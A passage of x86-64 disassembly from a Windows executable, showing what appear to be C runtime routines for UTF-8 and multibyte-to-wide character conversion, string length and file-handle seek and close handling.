   14000afef:	49 8b e3             	mov    %r11,%rsp
   14000aff2:	5f                   	pop    %rdi
   14000aff3:	c3                   	ret
   14000aff4:	48 8b c4             	mov    %rsp,%rax
   14000aff7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000affb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000afff:	48 89 78 18          	mov    %rdi,0x18(%rax)
   14000b003:	55                   	push   %rbp
   14000b004:	41 56                	push   %r14
   14000b006:	41 57                	push   %r15
   14000b008:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   14000b00c:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   14000b013:	45 33 ff             	xor    %r15d,%r15d
   14000b016:	4c 8b f2             	mov    %rdx,%r14
   14000b019:	48 8b f1             	mov    %rcx,%rsi
   14000b01c:	4c 89 7d 17          	mov    %r15,0x17(%rbp)
   14000b020:	33 d2                	xor    %edx,%edx
   14000b022:	4c 89 7d 1f          	mov    %r15,0x1f(%rbp)
   14000b026:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   14000b02a:	4c 89 7d 27          	mov    %r15,0x27(%rbp)
   14000b02e:	4c 89 7d 2f          	mov    %r15,0x2f(%rbp)
   14000b032:	41 8b ff             	mov    %r15d,%edi
   14000b035:	4c 89 7d 37          	mov    %r15,0x37(%rbp)
   14000b039:	44 88 7d 3f          	mov    %r15b,0x3f(%rbp)
   14000b03d:	4c 89 7d e7          	mov    %r15,-0x19(%rbp)
   14000b041:	4c 89 7d ef          	mov    %r15,-0x11(%rbp)
   14000b045:	4c 89 7d f7          	mov    %r15,-0x9(%rbp)
   14000b049:	4c 89 7d ff          	mov    %r15,-0x1(%rbp)
   14000b04d:	4c 89 7d 07          	mov    %r15,0x7(%rbp)
   14000b051:	44 88 7d 0f          	mov    %r15b,0xf(%rbp)
   14000b055:	e8 fa 9c ff ff       	call   0x140004d54
   14000b05a:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   14000b05e:	bb e9 fd 00 00       	mov    $0xfde9,%ebx
   14000b063:	39 58 0c             	cmp    %ebx,0xc(%rax)
   14000b066:	75 16                	jne    0x14000b07e
   14000b068:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000b06c:	74 0b                	je     0x14000b079
   14000b06e:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000b072:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b079:	44 8b c3             	mov    %ebx,%r8d
   14000b07c:	eb 36                	jmp    0x14000b0b4
   14000b07e:	e8 e1 8c ff ff       	call   0x140003d64
   14000b083:	85 c0                	test   %eax,%eax
   14000b085:	75 19                	jne    0x14000b0a0
   14000b087:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000b08b:	74 0b                	je     0x14000b098
   14000b08d:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000b091:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b098:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b09e:	eb 14                	jmp    0x14000b0b4
   14000b0a0:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000b0a4:	74 0b                	je     0x14000b0b1
   14000b0a6:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000b0aa:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b0b1:	45 8b c7             	mov    %r15d,%r8d
   14000b0b4:	48 8d 55 17          	lea    0x17(%rbp),%rdx
   14000b0b8:	48 8b ce             	mov    %rsi,%rcx
   14000b0bb:	e8 b0 be ff ff       	call   0x140006f70
   14000b0c0:	85 c0                	test   %eax,%eax
   14000b0c2:	0f 85 84 00 00 00    	jne    0x14000b14c
   14000b0c8:	33 d2                	xor    %edx,%edx
   14000b0ca:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   14000b0ce:	e8 81 9c ff ff       	call   0x140004d54
   14000b0d3:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   14000b0d7:	39 58 0c             	cmp    %ebx,0xc(%rax)
   14000b0da:	75 13                	jne    0x14000b0ef
   14000b0dc:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000b0e0:	74 42                	je     0x14000b124
   14000b0e2:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000b0e6:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b0ed:	eb 35                	jmp    0x14000b124
   14000b0ef:	e8 70 8c ff ff       	call   0x140003d64
   14000b0f4:	85 c0                	test   %eax,%eax
   14000b0f6:	75 18                	jne    0x14000b110
   14000b0f8:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000b0fc:	74 0b                	je     0x14000b109
   14000b0fe:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000b102:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b109:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000b10e:	eb 14                	jmp    0x14000b124
   14000b110:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000b114:	74 0b                	je     0x14000b121
   14000b116:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000b11a:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b121:	41 8b df             	mov    %r15d,%ebx
   14000b124:	44 8b c3             	mov    %ebx,%r8d
   14000b127:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   14000b12b:	49 8b ce             	mov    %r14,%rcx
   14000b12e:	e8 3d be ff ff       	call   0x140006f70
   14000b133:	48 8b 7d f7          	mov    -0x9(%rbp),%rdi
   14000b137:	85 c0                	test   %eax,%eax
   14000b139:	75 11                	jne    0x14000b14c
   14000b13b:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   14000b13f:	48 8b d7             	mov    %rdi,%rdx
   14000b142:	ff 15 b0 a7 00 00    	call   *0xa7b0(%rip)        # 0x1400158f8
   14000b148:	8b d8                	mov    %eax,%ebx
   14000b14a:	eb 03                	jmp    0x14000b14f
   14000b14c:	41 8b df             	mov    %r15d,%ebx
   14000b14f:	44 38 7d 0f          	cmp    %r15b,0xf(%rbp)
   14000b153:	74 08                	je     0x14000b15d
   14000b155:	48 8b cf             	mov    %rdi,%rcx
   14000b158:	e8 77 a6 ff ff       	call   0x1400057d4
   14000b15d:	44 38 7d 3f          	cmp    %r15b,0x3f(%rbp)
   14000b161:	74 09                	je     0x14000b16c
   14000b163:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   14000b167:	e8 68 a6 ff ff       	call   0x1400057d4
   14000b16c:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   14000b173:	00 
   14000b174:	8b c3                	mov    %ebx,%eax
   14000b176:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000b17a:	49 8b 73 28          	mov    0x28(%r11),%rsi
   14000b17e:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   14000b182:	49 8b e3             	mov    %r11,%rsp
   14000b185:	41 5f                	pop    %r15
   14000b187:	41 5e                	pop    %r14
   14000b189:	5d                   	pop    %rbp
   14000b18a:	c3                   	ret
   14000b18b:	cc                   	int3
   14000b18c:	45 33 c9             	xor    %r9d,%r9d
   14000b18f:	e9 00 00 00 00       	jmp    0x14000b194
   14000b194:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b199:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000b19e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000b1a3:	57                   	push   %rdi
   14000b1a4:	48 83 ec 50          	sub    $0x50,%rsp
   14000b1a8:	33 ed                	xor    %ebp,%ebp
   14000b1aa:	49 8b f0             	mov    %r8,%rsi
   14000b1ad:	48 8b fa             	mov    %rdx,%rdi
   14000b1b0:	48 8b d9             	mov    %rcx,%rbx
   14000b1b3:	48 85 d2             	test   %rdx,%rdx
   14000b1b6:	0f 84 38 01 00 00    	je     0x14000b2f4
   14000b1bc:	4d 85 c0             	test   %r8,%r8
   14000b1bf:	0f 84 2f 01 00 00    	je     0x14000b2f4
   14000b1c5:	40 38 2a             	cmp    %bpl,(%rdx)
   14000b1c8:	75 11                	jne    0x14000b1db
   14000b1ca:	48 85 c9             	test   %rcx,%rcx
   14000b1cd:	0f 84 28 01 00 00    	je     0x14000b2fb
   14000b1d3:	66 89 29             	mov    %bp,(%rcx)
   14000b1d6:	e9 20 01 00 00       	jmp    0x14000b2fb
   14000b1db:	49 8b d1             	mov    %r9,%rdx
   14000b1de:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000b1e3:	e8 6c 9b ff ff       	call   0x140004d54
   14000b1e8:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000b1ed:	81 78 0c e9 fd 00 00 	cmpl   $0xfde9,0xc(%rax)
   14000b1f4:	75 22                	jne    0x14000b218
   14000b1f6:	4c 8d 0d cb d9 00 00 	lea    0xd9cb(%rip),%r9        # 0x140018bc8
   14000b1fd:	4c 8b c6             	mov    %rsi,%r8
   14000b200:	48 8b d7             	mov    %rdi,%rdx
   14000b203:	48 8b cb             	mov    %rbx,%rcx
   14000b206:	e8 c5 01 00 00       	call   0x14000b3d0
   14000b20b:	48 8b c8             	mov    %rax,%rcx
   14000b20e:	83 c8 ff             	or     $0xffffffff,%eax
   14000b211:	85 c9                	test   %ecx,%ecx
   14000b213:	0f 48 c8             	cmovs  %eax,%ecx
   14000b216:	eb 19                	jmp    0x14000b231
   14000b218:	48 39 a8 38 01 00 00 	cmp    %rbp,0x138(%rax)
   14000b21f:	75 2a                	jne    0x14000b24b
   14000b221:	48 85 db             	test   %rbx,%rbx
   14000b224:	74 06                	je     0x14000b22c
   14000b226:	0f b6 07             	movzbl (%rdi),%eax
   14000b229:	66 89 03             	mov    %ax,(%rbx)
   14000b22c:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000b231:	40 38 6c 24 48       	cmp    %bpl,0x48(%rsp)
   14000b236:	74 0c                	je     0x14000b244
   14000b238:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000b23d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b244:	8b c1                	mov    %ecx,%eax
   14000b246:	e9 b2 00 00 00       	jmp    0x14000b2fd
   14000b24b:	0f b6 0f             	movzbl (%rdi),%ecx
   14000b24e:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   14000b253:	e8 88 09 00 00       	call   0x14000bbe0
   14000b258:	85 c0                	test   %eax,%eax
   14000b25a:	74 52                	je     0x14000b2ae
   14000b25c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000b261:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   14000b265:	41 83 f9 01          	cmp    $0x1,%r9d
   14000b269:	7e 2f                	jle    0x14000b29a
   14000b26b:	41 3b f1             	cmp    %r9d,%esi
   14000b26e:	7c 2a                	jl     0x14000b29a
   14000b270:	8b 49 0c             	mov    0xc(%rcx),%ecx
   14000b273:	8b c5                	mov    %ebp,%eax
   14000b275:	48 85 db             	test   %rbx,%rbx
   14000b278:	4c 8b c7             	mov    %rdi,%r8
   14000b27b:	ba 09 00 00 00       	mov    $0x9,%edx
   14000b280:	0f 95 c0             	setne  %al
   14000b283:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000b287:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000b28c:	e8 1b b7 ff ff       	call   0x1400069ac
   14000b291:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000b296:	85 c0                	test   %eax,%eax
   14000b298:	75 0f                	jne    0x14000b2a9
   14000b29a:	48 63 41 08          	movslq 0x8(%rcx),%rax
   14000b29e:	48 3b f0             	cmp    %rax,%rsi
   14000b2a1:	72 3e                	jb     0x14000b2e1
   14000b2a3:	40 38 6f 01          	cmp    %bpl,0x1(%rdi)
   14000b2a7:	74 38                	je     0x14000b2e1
   14000b2a9:	8b 49 08             	mov    0x8(%rcx),%ecx
   14000b2ac:	eb 83                	jmp    0x14000b231
   14000b2ae:	8b c5                	mov    %ebp,%eax
   14000b2b0:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000b2b6:	48 85 db             	test   %rbx,%rbx
   14000b2b9:	4c 8b c7             	mov    %rdi,%r8
   14000b2bc:	0f 95 c0             	setne  %al
   14000b2bf:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000b2c3:	41 8d 51 08          	lea    0x8(%r9),%edx
   14000b2c7:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000b2cc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000b2d1:	8b 48 0c             	mov    0xc(%rax),%ecx
   14000b2d4:	e8 d3 b6 ff ff       	call   0x1400069ac
   14000b2d9:	85 c0                	test   %eax,%eax
   14000b2db:	0f 85 4b ff ff ff    	jne    0x14000b22c
   14000b2e1:	e8 16 b0 ff ff       	call   0x1400062fc
   14000b2e6:	83 c9 ff             	or     $0xffffffff,%ecx
   14000b2e9:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000b2ef:	e9 3d ff ff ff       	jmp    0x14000b231
   14000b2f4:	48 89 2d cd d8 00 00 	mov    %rbp,0xd8cd(%rip)        # 0x140018bc8
   14000b2fb:	33 c0                	xor    %eax,%eax
   14000b2fd:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000b302:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000b307:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000b30c:	48 83 c4 50          	add    $0x50,%rsp
   14000b310:	5f                   	pop    %rdi
   14000b311:	c3                   	ret
   14000b312:	cc                   	int3
   14000b313:	cc                   	int3
   14000b314:	33 c0                	xor    %eax,%eax
   14000b316:	38 01                	cmp    %al,(%rcx)
   14000b318:	74 0e                	je     0x14000b328
   14000b31a:	48 3b c2             	cmp    %rdx,%rax
   14000b31d:	74 09                	je     0x14000b328
   14000b31f:	48 ff c0             	inc    %rax
   14000b322:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000b326:	75 f2                	jne    0x14000b31a
   14000b328:	c3                   	ret
   14000b329:	cc                   	int3
   14000b32a:	cc                   	int3
   14000b32b:	cc                   	int3
   14000b32c:	e9 03 00 00 00       	jmp    0x14000b334
   14000b331:	cc                   	int3
   14000b332:	cc                   	int3
   14000b333:	cc                   	int3
   14000b334:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b339:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b33e:	57                   	push   %rdi
   14000b33f:	48 83 ec 20          	sub    $0x20,%rsp
   14000b343:	48 63 d9             	movslq %ecx,%rbx
   14000b346:	41 8b f8             	mov    %r8d,%edi
   14000b349:	8b cb                	mov    %ebx,%ecx
   14000b34b:	48 8b f2             	mov    %rdx,%rsi
   14000b34e:	e8 f5 ce ff ff       	call   0x140008248
   14000b353:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b357:	75 11                	jne    0x14000b36a
   14000b359:	e8 9e af ff ff       	call   0x1400062fc
   14000b35e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b364:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b368:	eb 53                	jmp    0x14000b3bd
   14000b36a:	44 8b cf             	mov    %edi,%r9d
   14000b36d:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000b372:	48 8b d6             	mov    %rsi,%rdx
   14000b375:	48 8b c8             	mov    %rax,%rcx
   14000b378:	ff 15 82 a5 00 00    	call   *0xa582(%rip)        # 0x140015900
   14000b37e:	85 c0                	test   %eax,%eax
   14000b380:	75 0f                	jne    0x14000b391
   14000b382:	ff 15 80 a4 00 00    	call   *0xa480(%rip)        # 0x140015808
   14000b388:	8b c8                	mov    %eax,%ecx
   14000b38a:	e8 ad af ff ff       	call   0x14000633c
   14000b38f:	eb d3                	jmp    0x14000b364
   14000b391:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000b396:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b39a:	74 c8                	je     0x14000b364
   14000b39c:	48 8b d3             	mov    %rbx,%rdx
   14000b39f:	4c 8d 05 4a d3 00 00 	lea    0xd34a(%rip),%r8        # 0x1400186f0
   14000b3a6:	83 e2 3f             	and    $0x3f,%edx
   14000b3a9:	48 8b cb             	mov    %rbx,%rcx
   14000b3ac:	48 c1 f9 06          	sar    $0x6,%rcx
   14000b3b0:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000b3b4:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000b3b8:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   14000b3bd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b3c2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000b3c7:	48 83 c4 20          	add    $0x20,%rsp
   14000b3cb:	5f                   	pop    %rdi
   14000b3cc:	c3                   	ret
   14000b3cd:	cc                   	int3
   14000b3ce:	cc                   	int3
   14000b3cf:	cc                   	int3
   14000b3d0:	40 53                	rex push %rbx
   14000b3d2:	48 83 ec 30          	sub    $0x30,%rsp
   14000b3d6:	48 8b d9             	mov    %rcx,%rbx
   14000b3d9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000b3de:	e8 55 09 00 00       	call   0x14000bd38
   14000b3e3:	48 83 f8 04          	cmp    $0x4,%rax
   14000b3e7:	77 1a                	ja     0x14000b403
   14000b3e9:	8b 54 24 20          	mov    0x20(%rsp),%edx
   14000b3ed:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   14000b3f2:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
   14000b3f8:	0f 47 d1             	cmova  %ecx,%edx
   14000b3fb:	48 85 db             	test   %rbx,%rbx
   14000b3fe:	74 03                	je     0x14000b403
   14000b400:	66 89 13             	mov    %dx,(%rbx)
   14000b403:	48 83 c4 30          	add    $0x30,%rsp
   14000b407:	5b                   	pop    %rbx
   14000b408:	c3                   	ret
   14000b409:	cc                   	int3
   14000b40a:	cc                   	int3
   14000b40b:	cc                   	int3
   14000b40c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b411:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000b416:	57                   	push   %rdi
   14000b417:	41 54                	push   %r12
   14000b419:	41 55                	push   %r13
   14000b41b:	41 56                	push   %r14
   14000b41d:	41 57                	push   %r15
   14000b41f:	48 83 ec 20          	sub    $0x20,%rsp
   14000b423:	48 8b 3a             	mov    (%rdx),%rdi
   14000b426:	45 33 ed             	xor    %r13d,%r13d
   14000b429:	4d 8b e1             	mov    %r9,%r12
   14000b42c:	49 8b e8             	mov    %r8,%rbp
   14000b42f:	4c 8b f2             	mov    %rdx,%r14
   14000b432:	4c 8b f9             	mov    %rcx,%r15
   14000b435:	48 85 c9             	test   %rcx,%rcx
   14000b438:	0f 84 ee 00 00 00    	je     0x14000b52c
   14000b43e:	48 8b d9             	mov    %rcx,%rbx
   14000b441:	4d 85 c0             	test   %r8,%r8
   14000b444:	0f 84 a1 00 00 00    	je     0x14000b4eb
   14000b44a:	44 38 2f             	cmp    %r13b,(%rdi)
   14000b44d:	75 08                	jne    0x14000b457
   14000b44f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b455:	eb 1d                	jmp    0x14000b474
   14000b457:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000b45b:	75 08                	jne    0x14000b465
   14000b45d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b463:	eb 0f                	jmp    0x14000b474
   14000b465:	8a 47 02             	mov    0x2(%rdi),%al
   14000b468:	f6 d8                	neg    %al
   14000b46a:	4d 1b c0             	sbb    %r8,%r8
   14000b46d:	49 f7 d8             	neg    %r8
   14000b470:	49 83 c0 03          	add    $0x3,%r8
   14000b474:	4d 8b cc             	mov    %r12,%r9
   14000b477:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000b47c:	48 8b d7             	mov    %rdi,%rdx
   14000b47f:	e8 b4 08 00 00       	call   0x14000bd38
   14000b484:	48 8b d0             	mov    %rax,%rdx
   14000b487:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b48b:	74 75                	je     0x14000b502
   14000b48d:	48 85 c0             	test   %rax,%rax
   14000b490:	74 67                	je     0x14000b4f9
   14000b492:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000b496:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000b49c:	76 39                	jbe    0x14000b4d7
   14000b49e:	48 83 fd 01          	cmp    $0x1,%rbp
   14000b4a2:	76 47                	jbe    0x14000b4eb
   14000b4a4:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   14000b4aa:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   14000b4b0:	8b c1                	mov    %ecx,%eax
   14000b4b2:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   14000b4b6:	c1 e8 0a             	shr    $0xa,%eax
   14000b4b9:	48 ff cd             	dec    %rbp
   14000b4bc:	66 41 0b c0          	or     %r8w,%ax
   14000b4c0:	66 89 03             	mov    %ax,(%rbx)
   14000b4c3:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   14000b4c8:	66 23 c8             	and    %ax,%cx
   14000b4cb:	48 83 c3 02          	add    $0x2,%rbx
   14000b4cf:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   14000b4d4:	66 0b c8             	or     %ax,%cx
   14000b4d7:	66 89 0b             	mov    %cx,(%rbx)
   14000b4da:	48 03 fa             	add    %rdx,%rdi
   14000b4dd:	48 83 c3 02          	add    $0x2,%rbx
   14000b4e1:	48 83 ed 01          	sub    $0x1,%rbp
   14000b4e5:	0f 85 5f ff ff ff    	jne    0x14000b44a
   14000b4eb:	49 2b df             	sub    %r15,%rbx
   14000b4ee:	49 89 3e             	mov    %rdi,(%r14)
   14000b4f1:	48 d1 fb             	sar    $1,%rbx
   14000b4f4:	48 8b c3             	mov    %rbx,%rax
   14000b4f7:	eb 1b                	jmp    0x14000b514
   14000b4f9:	49 8b fd             	mov    %r13,%rdi
   14000b4fc:	66 44 89 2b          	mov    %r13w,(%rbx)
   14000b500:	eb e9                	jmp    0x14000b4eb
   14000b502:	49 89 3e             	mov    %rdi,(%r14)
   14000b505:	e8 f2 ad ff ff       	call   0x1400062fc
   14000b50a:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000b510:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b514:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000b519:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000b51e:	48 83 c4 20          	add    $0x20,%rsp
   14000b522:	41 5f                	pop    %r15
   14000b524:	41 5e                	pop    %r14
   14000b526:	41 5d                	pop    %r13
   14000b528:	41 5c                	pop    %r12
   14000b52a:	5f                   	pop    %rdi
   14000b52b:	c3                   	ret
   14000b52c:	49 8b dd             	mov    %r13,%rbx
   14000b52f:	44 38 2f             	cmp    %r13b,(%rdi)
   14000b532:	75 08                	jne    0x14000b53c
   14000b534:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b53a:	eb 1d                	jmp    0x14000b559
   14000b53c:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000b540:	75 08                	jne    0x14000b54a
   14000b542:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b548:	eb 0f                	jmp    0x14000b559
   14000b54a:	8a 47 02             	mov    0x2(%rdi),%al
   14000b54d:	f6 d8                	neg    %al
   14000b54f:	4d 1b c0             	sbb    %r8,%r8
   14000b552:	49 f7 d8             	neg    %r8
   14000b555:	49 83 c0 03          	add    $0x3,%r8
   14000b559:	4d 8b cc             	mov    %r12,%r9
   14000b55c:	48 8b d7             	mov    %rdi,%rdx
   14000b55f:	33 c9                	xor    %ecx,%ecx
   14000b561:	e8 d2 07 00 00       	call   0x14000bd38
   14000b566:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b56a:	74 99                	je     0x14000b505
   14000b56c:	48 85 c0             	test   %rax,%rax
   14000b56f:	74 83                	je     0x14000b4f4
   14000b571:	48 83 f8 04          	cmp    $0x4,%rax
   14000b575:	75 03                	jne    0x14000b57a
   14000b577:	48 ff c3             	inc    %rbx
   14000b57a:	48 03 f8             	add    %rax,%rdi
   14000b57d:	48 ff c3             	inc    %rbx
   14000b580:	eb ad                	jmp    0x14000b52f
   14000b582:	cc                   	int3
   14000b583:	cc                   	int3
   14000b584:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000b589:	48 83 ec 28          	sub    $0x28,%rsp
   14000b58d:	e8 7e 09 00 00       	call   0x14000bf10
   14000b592:	85 c0                	test   %eax,%eax
   14000b594:	74 1f                	je     0x14000b5b5
   14000b596:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000b59b:	ba 01 00 00 00       	mov    $0x1,%edx
   14000b5a0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000b5a5:	e8 ba 09 00 00       	call   0x14000bf64
   14000b5aa:	85 c0                	test   %eax,%eax
   14000b5ac:	74 07                	je     0x14000b5b5
   14000b5ae:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   14000b5b3:	eb 05                	jmp    0x14000b5ba
   14000b5b5:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000b5ba:	48 83 c4 28          	add    $0x28,%rsp
   14000b5be:	c3                   	ret
   14000b5bf:	cc                   	int3
   14000b5c0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b5c5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000b5ca:	57                   	push   %rdi
   14000b5cb:	48 83 ec 20          	sub    $0x20,%rsp
   14000b5cf:	48 8b d9             	mov    %rcx,%rbx
   14000b5d2:	48 85 c9             	test   %rcx,%rcx
   14000b5d5:	75 1e                	jne    0x14000b5f5
   14000b5d7:	e8 20 ad ff ff       	call   0x1400062fc
   14000b5dc:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b5e2:	e8 e9 a2 ff ff       	call   0x1400058d0
   14000b5e7:	83 c8 ff             	or     $0xffffffff,%eax
   14000b5ea:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000b5ef:	48 83 c4 20          	add    $0x20,%rsp
   14000b5f3:	5f                   	pop    %rdi
   14000b5f4:	c3                   	ret
   14000b5f5:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b5f8:	c1 e8 0c             	shr    $0xc,%eax
   14000b5fb:	a8 01                	test   $0x1,%al
   14000b5fd:	74 07                	je     0x14000b606
   14000b5ff:	e8 14 0c 00 00       	call   0x14000c218
   14000b604:	eb e1                	jmp    0x14000b5e7
   14000b606:	e8 5d ab ff ff       	call   0x140006168
   14000b60b:	90                   	nop
   14000b60c:	48 8b cb             	mov    %rbx,%rcx
   14000b60f:	e8 10 00 00 00       	call   0x14000b624
   14000b614:	8b f8                	mov    %eax,%edi
   14000b616:	48 8b cb             	mov    %rbx,%rcx
   14000b619:	e8 56 ab ff ff       	call   0x140006174
   14000b61e:	8b c7                	mov    %edi,%eax
   14000b620:	eb c8                	jmp    0x14000b5ea
   14000b622:	cc                   	int3
   14000b623:	cc                   	int3
   14000b624:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b629:	57                   	push   %rdi
   14000b62a:	48 83 ec 20          	sub    $0x20,%rsp
   14000b62e:	48 8b d9             	mov    %rcx,%rbx
   14000b631:	48 85 c9             	test   %rcx,%rcx
   14000b634:	75 15                	jne    0x14000b64b
   14000b636:	e8 c1 ac ff ff       	call   0x1400062fc
   14000b63b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b641:	e8 8a a2 ff ff       	call   0x1400058d0
   14000b646:	83 c8 ff             	or     $0xffffffff,%eax
   14000b649:	eb 51                	jmp    0x14000b69c
   14000b64b:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b64e:	83 cf ff             	or     $0xffffffff,%edi
   14000b651:	c1 e8 0d             	shr    $0xd,%eax
   14000b654:	a8 01                	test   $0x1,%al
   14000b656:	74 3a                	je     0x14000b692
   14000b658:	e8 b3 a8 ff ff       	call   0x140005f10
   14000b65d:	48 8b cb             	mov    %rbx,%rcx
   14000b660:	8b f8                	mov    %eax,%edi
   14000b662:	e8 69 ec ff ff       	call   0x14000a2d0
   14000b667:	48 8b cb             	mov    %rbx,%rcx
   14000b66a:	e8 85 eb ff ff       	call   0x14000a1f4
   14000b66f:	8b c8                	mov    %eax,%ecx
   14000b671:	e8 ca 09 00 00       	call   0x14000c040
   14000b676:	85 c0                	test   %eax,%eax
   14000b678:	79 05                	jns    0x14000b67f
   14000b67a:	83 cf ff             	or     $0xffffffff,%edi
   14000b67d:	eb 13                	jmp    0x14000b692
   14000b67f:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000b683:	48 85 c9             	test   %rcx,%rcx
   14000b686:	74 0a                	je     0x14000b692
   14000b688:	e8 47 a1 ff ff       	call   0x1400057d4
   14000b68d:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000b692:	48 8b cb             	mov    %rbx,%rcx
   14000b695:	e8 7e 0b 00 00       	call   0x14000c218
   14000b69a:	8b c7                	mov    %edi,%eax
   14000b69c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b6a1:	48 83 c4 20          	add    $0x20,%rsp
   14000b6a5:	5f                   	pop    %rdi
